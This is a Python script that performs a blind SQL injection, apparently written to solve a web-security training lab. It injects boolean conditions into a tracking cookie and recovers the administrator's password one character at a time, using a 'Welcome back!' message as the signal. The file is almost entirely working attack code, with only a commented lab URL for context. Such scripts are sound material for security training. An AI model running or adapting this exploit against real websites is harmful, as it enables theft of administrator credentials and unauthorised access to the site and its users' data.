import requests
from bs4 import BeautifulSoup
import re
import time
from colorama import Fore,Style



url = input("Enter the URL: ") 
# "https://0a4d001d03c8a749c025ea7800d700a7.web-security-academy.net"

session = requests.Session()

proxy = {
    "http" : "http://127.0.0.1:8080", 
    "https" : "http://127.0.0.1:8080" 
}


response = session.get(url)


atz = "abcdefghijklmnopqrstuvwxyz1234567890._-!".lower()
password = ""

for j in range(25):
    for i in atz:
        
        headers = {
                "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
                "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Encoding" : "gzip, deflate",
                "Referer": url,
                "Upgrade-Insecure-Requests" : "1",
                "Cookie" : f"TrackingId={response.cookies.values()[0]}' and substr((select password from users where username='administrator'),{j},1) = '{i}; session={response.cookies.values()[1]}",
                "Sec-Fetch-Dest" : "document",
                "Sec-Fetch-Mode" : "navigate",
                "Sec-Fetch-Site" : "same-origin",
                "Sec-Fetch-User" : "?1",
                "Te" : "trailers",
        }
        
        res = session.get(f"{url}/filter?category=Accessories", headers=headers, proxies=proxy, verify=False)

        soup = str(BeautifulSoup(res.content, "html.parser"))

        reSearch = re.search("Welcome back!", soup)

        if reSearch:
            password += i
            print(password)
        else:
            continue
            
            
print(f"The Password is: {password}")


# print(f"response_to_panel: {response_to_panel.status_code}")

